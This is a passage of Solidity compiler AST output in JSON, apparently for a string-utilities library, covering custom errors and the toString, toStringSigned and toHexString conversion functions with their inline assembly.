4951760157141521099596496896"},"id":279,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"leftExpression":{"hexValue":"31","id":277,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"748:1:3","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"nodeType":"BinaryOperation","operator":"<<","rightExpression":{"hexValue":"30783563","id":278,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"753:4:3","typeDescriptions":{"typeIdentifier":"t_rational_92_by_1","typeString":"int_const 92"},"value":"0x5c"},"src":"748:9:3","typeDescriptions":{"typeIdentifier":"t_rational_4951760157141521099596496896_by_1","typeString":"int_const 4951760157141521099596496896"}}],"id":280,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"747:11:3","typeDescriptions":{"typeIdentifier":"t_rational_4951760157141521099596496896_by_1","typeString":"int_const 4951760157141521099596496896"}},"src":"512:246:3","typeDescriptions":{"typeIdentifier":"t_rational_4951760157141521116776380160_by_1","typeString":"int_const 4951760157141521116776380160"}},"visibility":"private"},{"documentation":{"id":283,"nodeType":"StructuredDocumentation","src":"778:81:3","text":" @dev The `value` string doesn't fit in the specified `length`."},"errorSelector":"e22e27eb","id":289,"name":"StringsInsufficientHexLength","nameLocation":"870:28:3","nodeType":"ErrorDefinition","parameters":{"id":288,"nodeType":"ParameterList","parameters":[{"constant":false,"id":285,"mutability":"mutable","name":"value","nameLocation":"907:5:3","nodeType":"VariableDeclaration","scope":289,"src":"899:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":284,"name":"uint256","nodeType":"ElementaryTypeName","src":"899:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":287,"mutability":"mutable","name":"length","nameLocation":"922:6:3","nodeType":"VariableDeclaration","scope":289,"src":"914:14:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":286,"name":"uint256","nodeType":"ElementaryTypeName","src":"914:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"898:31:3"},"src":"864:66:3"},{"documentation":{"id":290,"nodeType":"StructuredDocumentation","src":"936:108:3","text":" @dev The string being parsed contains characters that are not in scope of the given base."},"errorSelector":"94e2737e","id":292,"name":"StringsInvalidChar","nameLocation":"1055:18:3","nodeType":"ErrorDefinition","parameters":{"id":291,"nodeType":"ParameterList","parameters":[],"src":"1073:2:3"},"src":"1049:27:3"},{"documentation":{"id":293,"nodeType":"StructuredDocumentation","src":"1082:84:3","text":" @dev The string being parsed is not a properly formatted address."},"errorSelector":"1d15ae44","id":295,"name":"StringsInvalidAddressFormat","nameLocation":"1177:27:3","nodeType":"ErrorDefinition","parameters":{"id":294,"nodeType":"ParameterList","parameters":[],"src":"1204:2:3"},"src":"1171:36:3"},{"body":{"id":342,"nodeType":"Block","src":"1379:563:3","statements":[{"id":341,"nodeType":"UncheckedBlock","src":"1389:547:3","statements":[{"assignments":[304],"declarations":[{"constant":false,"id":304,"mutability":"mutable","name":"length","nameLocation":"1421:6:3","nodeType":"VariableDeclaration","scope":341,"src":"1413:14:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":303,"name":"uint256","nodeType":"ElementaryTypeName","src":"1413:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":311,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":310,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":307,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":298,"src":"1441:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":305,"name":"Math","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3686,"src":"1430:4:3","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Math_$3686_$","typeString":"type(library Math)"}},"id":306,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"1435:5:3","memberName":"log10","nodeType":"MemberAccess","referencedDeclaration":3518,"src":"1430:10:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256) pure returns (uint256)"}},"id":308,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1430:17:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"hexValue":"31","id":309,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1450:1:3","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"1430:21:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"1413:38:3"},{"assignments":[313],"declarations":[{"constant":false,"id":313,"mutability":"mutable","name":"buffer","nameLocation":"1479:6:3","nodeType":"VariableDeclaration","scope":341,"src":"1465:20:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":312,"name":"string","nodeType":"ElementaryTypeName","src":"1465:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"id":318,"initialValue":{"arguments":[{"id":316,"name":"length","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":304,"src":"1499:6:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":315,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"NewExpression","src":"1488:10:3","typeDescriptions":{"typeIdentifier":"t_function_objectcreation_pure$_t_uint256_$returns$_t_string_memory_ptr_$","typeString":"function (uint256) pure returns (string memory)"},"typeName":{"id":314,"name":"string","nodeType":"ElementaryTypeName","src":"1492:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}}},"id":317,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1488:18:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"nodeType":"VariableDeclarationStatement","src":"1465:41:3"},{"assignments":[320],"declarations":[{"constant":false,"id":320,"mutability":"mutable","name":"ptr","nameLocation":"1528:3:3","nodeType":"VariableDeclaration","scope":341,"src":"1520:11:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":319,"name":"uint256","nodeType":"ElementaryTypeName","src":"1520:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":321,"nodeType":"VariableDeclarationStatement","src":"1520:11:3"},{"AST":{"nativeSrc":"1570:69:3","nodeType":"YulBlock","src":"1570:69:3","statements":[{"nativeSrc":"1588:37:3","nodeType":"YulAssignment","src":"1588:37:3","value":{"arguments":[{"arguments":[{"name":"buffer","nativeSrc":"1603:6:3","nodeType":"YulIdentifier","src":"1603:6:3"},{"kind":"number","nativeSrc":"1611:4:3","nodeType":"YulLiteral","src":"1611:4:3","type":"","value":"0x20"}],"functionName":{"name":"add","nativeSrc":"1599:3:3","nodeType":"YulIdentifier","src":"1599:3:3"},"nativeSrc":"1599:17:3","nodeType":"YulFunctionCall","src":"1599:17:3"},{"name":"length","nativeSrc":"1618:6:3","nodeType":"YulIdentifier","src":"1618:6:3"}],"functionName":{"name":"add","nativeSrc":"1595:3:3","nodeType":"YulIdentifier","src":"1595:3:3"},"nativeSrc":"1595:30:3","nodeType":"YulFunctionCall","src":"1595:30:3"},"variableNames":[{"name":"ptr","nativeSrc":"1588:3:3","nodeType":"YulIdentifier","src":"1588:3:3"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":313,"isOffset":false,"isSlot":false,"src":"1603:6:3","valueSize":1},{"declaration":304,"isOffset":false,"isSlot":false,"src":"1618:6:3","valueSize":1},{"declaration":320,"isOffset":false,"isSlot":false,"src":"1588:3:3","valueSize":1}],"flags":["memory-safe"],"id":322,"nodeType":"InlineAssembly","src":"1545:94:3"},{"body":{"id":337,"nodeType":"Block","src":"1665:234:3","statements":[{"expression":{"id":325,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"--","prefix":false,"src":"1683:5:3","subExpression":{"id":324,"name":"ptr","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":320,"src":"1683:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":326,"nodeType":"ExpressionStatement","src":"1683:5:3"},{"AST":{"nativeSrc":"1731:86:3","nodeType":"YulBlock","src":"1731:86:3","statements":[{"expression":{"arguments":[{"name":"ptr","nativeSrc":"1761:3:3","nodeType":"YulIdentifier","src":"1761:3:3"},{"arguments":[{"arguments":[{"name":"value","nativeSrc":"1775:5:3","nodeType":"YulIdentifier","src":"1775:5:3"},{"kind":"number","nativeSrc":"1782:2:3","nodeType":"YulLiteral","src":"1782:2:3","type":"","value":"10"}],"functionName":{"name":"mod","nativeSrc":"1771:3:3","nodeType":"YulIdentifier","src":"1771:3:3"},"nativeSrc":"1771:14:3","nodeType":"YulFunctionCall","src":"1771:14:3"},{"name":"HEX_DIGITS","nativeSrc":"1787:10:3","nodeType":"YulIdentifier","src":"1787:10:3"}],"functionName":{"name":"byte","nativeSrc":"1766:4:3","nodeType":"YulIdentifier","src":"1766:4:3"},"nativeSrc":"1766:32:3","nodeType":"YulFunctionCall","src":"1766:32:3"}],"functionName":{"name":"mstore8","nativeSrc":"1753:7:3","nodeType":"YulIdentifier","src":"1753:7:3"},"nativeSrc":"1753:46:3","nodeType":"YulFunctionCall","src":"1753:46:3"},"nativeSrc":"1753:46:3","nodeType":"YulExpressionStatement","src":"1753:46:3"}]},"evmVersion":"paris","externalReferences":[{"declaration":243,"isOffset":false,"isSlot":false,"src":"1787:10:3","valueSize":1},{"declaration":320,"isOffset":false,"isSlot":false,"src":"1761:3:3","valueSize":1},{"declaration":298,"isOffset":false,"isSlot":false,"src":"1775:5:3","valueSize":1}],"flags":["memory-safe"],"id":327,"nodeType":"InlineAssembly","src":"1706:111:3"},{"expression":{"id":330,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":328,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":298,"src":"1834:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"/=","rightHandSide":{"hexValue":"3130","id":329,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1843:2:3","typeDescriptions":{"typeIdentifier":"t_rational_10_by_1","typeString":"int_const 10"},"value":"10"},"src":"1834:11:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":331,"nodeType":"ExpressionStatement","src":"1834:11:3"},{"condition":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":334,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":332,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":298,"src":"1867:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"hexValue":"30","id":333,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"1876:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"1867:10:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":336,"nodeType":"IfStatement","src":"1863:21:3","trueBody":{"id":335,"nodeType":"Break","src":"1879:5:3"}}]},"condition":{"hexValue":"74727565","id":323,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"1659:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"true"},"id":338,"nodeType":"WhileStatement","src":"1652:247:3"},{"expression":{"id":339,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":313,"src":"1919:6:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"functionReturnParameters":302,"id":340,"nodeType":"Return","src":"1912:13:3"}]}]},"documentation":{"id":296,"nodeType":"StructuredDocumentation","src":"1213:90:3","text":" @dev Converts a `uint256` to its ASCII `string` decimal representation."},"id":343,"implemented":true,"kind":"function","modifiers":[],"name":"toString","nameLocation":"1317:8:3","nodeType":"FunctionDefinition","parameters":{"id":299,"nodeType":"ParameterList","parameters":[{"constant":false,"id":298,"mutability":"mutable","name":"value","nameLocation":"1334:5:3","nodeType":"VariableDeclaration","scope":343,"src":"1326:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":297,"name":"uint256","nodeType":"ElementaryTypeName","src":"1326:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1325:15:3"},"returnParameters":{"id":302,"nodeType":"ParameterList","parameters":[{"constant":false,"id":301,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":343,"src":"1364:13:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":300,"name":"string","nodeType":"ElementaryTypeName","src":"1364:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"1363:15:3"},"scope":1631,"src":"1308:634:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":368,"nodeType":"Block","src":"2118:92:3","statements":[{"expression":{"arguments":[{"condition":{"commonType":{"typeIdentifier":"t_int256","typeString":"int256"},"id":356,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":354,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":346,"src":"2149:5:3","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"nodeType":"BinaryOperation","operator":"<","rightExpression":{"hexValue":"30","id":355,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2157:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"2149:9:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"falseExpression":{"hexValue":"","id":358,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"2167:2:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","typeString":"literal_string \"\""},"value":""},"id":359,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"Conditional","src":"2149:20:3","trueExpression":{"hexValue":"2d","id":357,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"2161:3:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_d3b8281179950f98149eefdb158d0e1acb56f56e8e343aa9fefafa7e36959561","typeString":"literal_string \"-\""},"value":"-"},"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"arguments":[{"arguments":[{"id":363,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":346,"src":"2195:5:3","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_int256","typeString":"int256"}],"expression":{"id":361,"name":"SignedMath","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5595,"src":"2180:10:3","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SignedMath_$5595_$","typeString":"type(library SignedMath)"}},"id":362,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"2191:3:3","memberName":"abs","nodeType":"MemberAccess","referencedDeclaration":5594,"src":"2180:14:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_int256_$returns$_t_uint256_$","typeString":"function (int256) pure returns (uint256)"}},"id":364,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2180:21:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":360,"name":"toString","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":343,"src":"2171:8:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$_t_string_memory_ptr_$","typeString":"function (uint256) pure returns (string memory)"}},"id":365,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2171:31:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"expression":{"id":352,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"2135:6:3","typeDescriptions":{"typeIdentifier":"t_type$_t_string_storage_ptr_$","typeString":"type(string storage pointer)"},"typeName":{"id":351,"name":"string","nodeType":"ElementaryTypeName","src":"2135:6:3","typeDescriptions":{}}},"id":353,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"2142:6:3","memberName":"concat","nodeType":"MemberAccess","src":"2135:13:3","typeDescriptions":{"typeIdentifier":"t_function_stringconcat_pure$__$returns$_t_string_memory_ptr_$","typeString":"function () pure returns (string memory)"}},"id":366,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2135:68:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"functionReturnParameters":350,"id":367,"nodeType":"Return","src":"2128:75:3"}]},"documentation":{"id":344,"nodeType":"StructuredDocumentation","src":"1948:89:3","text":" @dev Converts a `int256` to its ASCII `string` decimal representation."},"id":369,"implemented":true,"kind":"function","modifiers":[],"name":"toStringSigned","nameLocation":"2051:14:3","nodeType":"FunctionDefinition","parameters":{"id":347,"nodeType":"ParameterList","parameters":[{"constant":false,"id":346,"mutability":"mutable","name":"value","nameLocation":"2073:5:3","nodeType":"VariableDeclaration","scope":369,"src":"2066:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"},"typeName":{"id":345,"name":"int256","nodeType":"ElementaryTypeName","src":"2066:6:3","typeDescriptions":{"typeIdentifier":"t_int256","typeString":"int256"}},"visibility":"internal"}],"src":"2065:14:3"},"returnParameters":{"id":350,"nodeType":"ParameterList","parameters":[{"constant":false,"id":349,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":369,"src":"2103:13:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":348,"name":"string","nodeType":"ElementaryTypeName","src":"2103:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"2102:15:3"},"scope":1631,"src":"2042:168:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":388,"nodeType":"Block","src":"2389:100:3","statements":[{"id":387,"nodeType":"UncheckedBlock","src":"2399:84:3","statements":[{"expression":{"arguments":[{"id":378,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":372,"src":"2442:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":384,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"id":381,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":372,"src":"2461:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"expression":{"id":379,"name":"Math","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":3686,"src":"2449:4:3","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_Math_$3686_$","typeString":"type(library Math)"}},"id":380,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"2454:6:3","memberName":"log256","nodeType":"MemberAccess","referencedDeclaration":3629,"src":"2449:11:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$returns$_t_uint256_$","typeString":"function (uint256) pure returns (uint256)"}},"id":382,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2449:18:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"hexValue":"31","id":383,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2470:1:3","typeDescriptions":{"typeIdentifier":"t_rational_1_by_1","typeString":"int_const 1"},"value":"1"},"src":"2449:22:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":377,"name":"toHexString","nodeType":"Identifier","overloadedDeclarations":[389,472,492],"referencedDeclaration":472,"src":"2430:11:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_string_memory_ptr_$","typeString":"function (uint256,uint256) pure returns (string memory)"}},"id":385,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2430:42:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},"functionReturnParameters":376,"id":386,"nodeType":"Return","src":"2423:49:3"}]}]},"documentation":{"id":370,"nodeType":"StructuredDocumentation","src":"2216:94:3","text":" @dev Converts a `uint256` to its ASCII `string` hexadecimal representation."},"id":389,"implemented":true,"kind":"function","modifiers":[],"name":"toHexString","nameLocation":"2324:11:3","nodeType":"FunctionDefinition","parameters":{"id":373,"nodeType":"ParameterList","parameters":[{"constant":false,"id":372,"mutability":"mutable","name":"value","nameLocation":"2344:5:3","nodeType":"VariableDeclaration","scope":389,"src":"2336:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":371,"name":"uint256","nodeType":"ElementaryTypeName","src":"2336:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2335:15:3"},"returnParameters":{"id":376,"nodeType":"ParameterList","parameters":[{"constant":false,"id":375,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":389,"src":"2374:13:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":374,"name":"string","nodeType":"ElementaryTypeName","src":"2374:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"2373:15:3"},"scope":1631,"src":"2315:174:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":471,"nodeType":"Block","src":"2702:435:3","statements":[{"assignments":[400],"declarations":[{"constant":false,"id":400,"mutability":"mutable","name":"localValue","nameLocation":"2720:10:3","nodeType":"VariableDeclaration","scope":471,"src":"2712:18:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":399,"name":"uint256","nodeType":"ElementaryTypeName","src":"2712:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":402,"initialValue":{"id":401,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":392,"src":"2733:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"2712:26:3"},{"assignments":[404],"declarations":[{"constant":false,"id":404,"mutability":"mutable","name":"buffer","nameLocation":"2761:6:3","nodeType":"VariableDeclaration","scope":471,"src":"2748:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes"},"typeName":{"id":403,"name":"bytes","nodeType":"ElementaryTypeName","src":"2748:5:3","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}},"visibility":"internal"}],"id":413,"initialValue":{"arguments":[{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":411,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":409,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"hexValue":"32","id":407,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2780:1:3","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":408,"name":"length","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":394,"src":"2784:6:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2780:10:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"hexValue":"32","id":410,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2793:1:3","typeDescriptions":{"typeIdentifier":"t_rational_2_by_1","typeString":"int_const 2"},"value":"2"},"src":"2780:14:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":406,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"NewExpression","src":"2770:9:3","typeDescriptions":{"typeIdentifier":"t_function_objectcreation_pure$_t_uint256_$returns$_t_bytes_memory_ptr_$","typeString":"function (uint256) pure returns (bytes memory)"},"typeName":{"id":405,"name":"bytes","nodeType":"ElementaryTypeName","src":"2774:5:3","typeDescriptions":{"typeIdentifier":"t_bytes_storage_ptr","typeString":"bytes"}}},"id":412,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2770:25:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"nodeType":"VariableDeclarationStatement","src":"2748:47:3"},{"expression":{"id":418,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"id":414,"name":"buffer","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":404,"src":"2805:6:3","typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":416,"indexExpression":{"hexValue":"30","id":415,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"2812:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"2805:9:3","typeDescriptions":{"typeIdentifier":"t_bytes1","typeString":"bytes1"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"hexValue":"30","id":417,"isConstant":false,"isLValue":false,"isPure":true,"kind":"string","lValueRequested":false,"nodeType":"Literal","src":"2817:3:3","typeDescriptions":{"typeIdentifier":"t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d","typeString":"literal_string 